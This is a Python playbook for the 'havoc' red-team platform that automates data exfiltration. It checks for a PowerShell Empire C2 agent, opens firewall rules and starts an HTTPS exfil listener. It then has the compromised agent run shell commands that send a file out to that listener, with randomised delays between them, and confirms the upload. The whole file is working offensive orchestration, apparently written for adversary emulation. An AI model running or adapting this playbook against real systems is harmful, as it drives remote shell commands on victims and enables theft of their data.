# Import the supporting Python packages.
import re
import os
import string
import random
import pprint
import time as t
import argparse
from datetime import datetime
from configparser import ConfigParser

# Import the havoc Python package.
import havoc

init_parser = argparse.ArgumentParser(description='havoc playbook - Simple Exfil')

init_parser.add_argument('--profile', help='Use a specific profile from your credential file')
init_args = init_parser.parse_args()

profile = init_args.profile

# Load the configuration file
config = ConfigParser()
config_file = os.path.expanduser('~/.havoc/config')
config.read(config_file)

# Get api_key and secret_key
if profile:
    api_key = config.get(profile, 'API_KEY')
    secret = config.get(profile, 'SECRET')
    api_region = config.get(profile, 'API_REGION')
    api_domain_name = config.get(profile, 'API_DOMAIN_NAME')
else:
    api_key = config.get('default', 'API_KEY')
    secret = config.get('default', 'SECRET')
    api_region = config.get('default', 'API_REGION')
    api_domain_name = config.get('default', 'API_DOMAIN_NAME')

h = havoc.Connect(api_region, api_domain_name, api_key, secret)

# Create a date string to use in the task name.
d = datetime.utcnow()
sdate = d.strftime('%m-%d-%Y-%H-%M')

# Configure pretty print for displaying output.
pp = pprint.PrettyPrinter(indent=4)

# Create a config parser and setup config parameters
config = ConfigParser()
config.read('havoc-playbooks/simple_exfil/simple_exfil.ini')

exfil_type = config.get('exfil_task', 'exfil_type')
exfil_port = config.get('exfil_task', 'exfil_port')
exfil_outfile = config.get('exfil_task', 'exfil_outfile')
exfil_task_domain_name = config.get('exfil_task', 'domain_name')
exfil_subj = config.get('exfil_task', 'cert_subj')
c2_task_name = config.get('c2_task', 'task_name')
c2_agent_name = config.get('c2_task', 'agent_name')
command_list = config.get('c2_task', 'command_list')

exfil_task_exists = None
exfil_portgroup_exists = None
exfil_service_exists = None

def get_task_target_ip(tn):
    task_details = h.get_task(tn)
    task_target_ip_list = task_details['local_ip']
    task_target_ip = None
    for ip in task_target_ip_list:
        if '172.17.' not in ip:
            task_target_ip = ip
    return task_target_ip


def clean_up():
    if exfil_task_exists:
        print(f'\nShutting down Exfil task {exfil_task_exists}.\n')
        task_shutdown_response = h.task_shutdown(exfil_task_exists)
        if 'completed' not in task_shutdown_response:
            print(f'Task shutdown for {exfil_task_exists} failed.\n')
            print(task_shutdown_response)
            exit('\nExiting.')
        t.sleep(5)

    if exfil_portgroup_exists:
        # Delete the Exfil portgroup.
        print(f'\nDeleting the {exfil_portgroup_exists} portgroup.')
        h.delete_portgroup(exfil_portgroup_exists)

    # All done.
    exit('\nDone... Exiting.\n')

# Verify c2_task exists
print(f'\nVerifying that C2 task {c2_task_name} exists.')
c2_task = h.verify_task(c2_task_name, 'powershell_empire')
if c2_task:
    print(f'C2 task {c2_task_name} found.')
else:
    exit(f'No powershell_empire task with name {c2_task_name} was found. Exiting...')

# Verify that the C2 agent exists.
print(f'\nVerifying that agent {c2_agent_name} exists.')
c2_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
c2_instruct_command = 'get_agents'
c2_instruct_args = {'Name': c2_agent_name}
agents_list = h.interact_with_task(c2_task_name, c2_instruct_instance, c2_instruct_command, c2_instruct_args)
agent_exists = False
agent_ip = None
for agent in agents_list['agents']:
    if c2_agent_name == agent['name']:
        agent_ip = agent['external_ip']
        agent_exists = True
if agent_exists:
    print(f'Agent {c2_agent_name} exists. Continuing...\n')
else:
    exit(f'Agent {c2_agent_name} not found. Exiting...\n')

# Create a portgroup for the Exfil task.
print(f'\nCreating a portgroup for the Exfil task.')
h.create_portgroup(f'exfil_{exfil_type}_{sdate}', f'Allows port {exfil_port} traffic')
print(f'\nAdding portgroup rule to allow agent IP {agent_ip} to reach port {exfil_port}.\n')
h.update_portgroup_rule(f'exfil_{exfil_type}_{sdate}', 'add', f'{agent_ip}/32', exfil_port, 'tcp')
h.update_portgroup_rule(f'exfil_{exfil_type}_{sdate}', 'add', f'{agent_ip}/32', exfil_port, 'udp')
exfil_portgroup_exists = f'exfil_{exfil_type}_{sdate}'

# Launch an Exfil task
exfil_task_name = f'exfil_{exfil_type}_{sdate}'
portgroups = [f'exfil_{exfil_type}_{sdate}']
if exfil_task_domain_name == 'None':
    exfil_task_host_name = 'None'
else:
    exfil_task_host_name = exfil_type
print(f'\nLaunching exfil task with name {exfil_task_name}.')
exfil_task = h.task_startup(
    exfil_task_name,
    'exfilkit',
    task_host_name=exfil_task_host_name,
    task_domain_name=exfil_task_domain_name,
    portgroups=portgroups
)
exfil_task_exists = exfil_task_name
exfil_task_ip = exfil_task['attack_ip']
print(f'\nThe exfil task is ready with the following parameters:')
print(f'\nIP - {exfil_task_ip}')
print(f'\nHost name - {exfil_task_host_name}')
print(f'\nDomain name - {exfil_task_domain_name}')

# Use a random string for the exfil_listener instruct_instance.
exfil_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# Ask the exfil_task to start an exfil listener service.
print(f'\nStarting an exfil listener service on {exfil_task_name}.')
instruct_args = {'listen_port': int(exfil_port), 'subj': exfil_subj}
instruct_command = 'start_https_exfil_server'
exfil_listener = h.interact_with_task(exfil_task_name, exfil_instruct_instance, instruct_command, instruct_args)
if exfil_listener['outcome'] == 'success':
    print('\nstart_https_exfil_server succeeded.\n')
    exfil_service_exists = [exfil_task_name, exfil_instruct_instance]
else:
    print('\nstart_https_exfil_server failed. Exfil listener output:\n')
    print(exfil_listener)
    print('\nExiting...\n')
    clean_up()

# Setup exfil host.
if exfil_task_domain_name != 'None':
    exfil_host = f'{exfil_task_host_name}.{exfil_task_domain_name}'
else:
    exfil_host = exfil_task_ip

# Execute a list of shell commands on the agent.
for command in command_list.split(', '):
    if command == 'pause':
        # Wait for key press and then go to the next command
        input('Paused. Press Enter to continue...')
        command = 'whoami'
    # Replace variables in shell_command
    exfil_outfile_insert = re.sub('\$EXFIL_OUTFILE', exfil_outfile, command)
    exfil_type_insert = re.sub('\$EXFIL_TYPE', exfil_type, exfil_outfile_insert)
    exfil_host_insert = re.sub('\$EXFIL_HOST', exfil_host, exfil_type_insert)
    shell_command = re.sub('\$EXFIL_PORT', exfil_port, exfil_host_insert)
    print(f'\nTasking agent with agent_shell_command "{shell_command}"\n')
    # Use a random string for the agent instruct_instance of each shell command.
    sc_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
    instruct_command = 'agent_shell_command'
    instruct_args = {'Name': c2_agent_name, 'command': shell_command}
    command_response = h.interact_with_task(c2_task_name, sc_instruct_instance, instruct_command, instruct_args)
    if command_response['outcome'] == 'success':
        print(f'{shell_command} succeeded.\n')
        command_task_id = command_response['message']['taskID']
    else:
        print(f'{instruct_command} failed.\n')
        command_task_id = None

    # Get the agent_shell_command results.
    if command_task_id:
        print(f'\nGetting results from agent_shell_command "{shell_command}"\n')
        results = None
        while not results:
            try:
                instruct_command = 'get_shell_command_results'
                instruct_args = {'Name': c2_agent_name}
                shell_results = h.interact_with_task(c2_task_name, sc_instruct_instance, instruct_command, instruct_args)
                if shell_results['outcome'] == 'success':
                    for shell_result in shell_results['results']:
                        if shell_result['taskID'] == command_task_id:
                            results = shell_result['results']
                else:
                    results = f'{instruct_command} failed.\n'
                if not results:
                    t.sleep(10)
            except KeyboardInterrupt:
                print('Interrupting get_shell_command_results. Exiting...')
                clean_up()
        print(f'\n{shell_command} results:\n')
        print(results)

    # Wait for the powershell_empire task to become idle.
    print(f'\nWaiting for powershell_empire task {c2_task_name} to become idle.')
    try:
        h.wait_for_idle_task
    except KeyboardInterrupt:
        print('Interrupting wait_for_idle_task. Exiting...')
        clean_up()
    print(f'\n{c2_task_name} is now idle.')
    t.sleep(random.randrange(20))

# Confirm that exfil was successful.
# Use a random string for the exfil_listener instruct_instance.
confirm_exfil_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
print(f'\nConfirming that {exfil_outfile} was successfully uploaded to {exfil_task_name}.')
instruct_command = 'ls'
ls_command = h.interact_with_task(exfil_task_name, confirm_exfil_instruct_instance, instruct_command)
if ls_command['outcome'] == 'success':
    dir_contents = ls_command['local_directory_contents']
    if exfil_outfile in dir_contents:
        print(f'\nUpload of {exfil_outfile} succeeded.\n')
        print(f'{exfil_task_name} local directory contents:\n')
        pp.pprint(dir_contents)
    else:
        print(f'\nUpload of {exfil_outfile} failed.\n')
        print(f'{exfil_task_name} local directory contents:\n')
        pp.pprint(dir_contents)
else:
    print(f'\nCould not list local directory contents for task {exfil_task_name}.\n')

# Playbook is complete.
print('\nPlaybook operation completed. Cleaning up...')
clean_up()
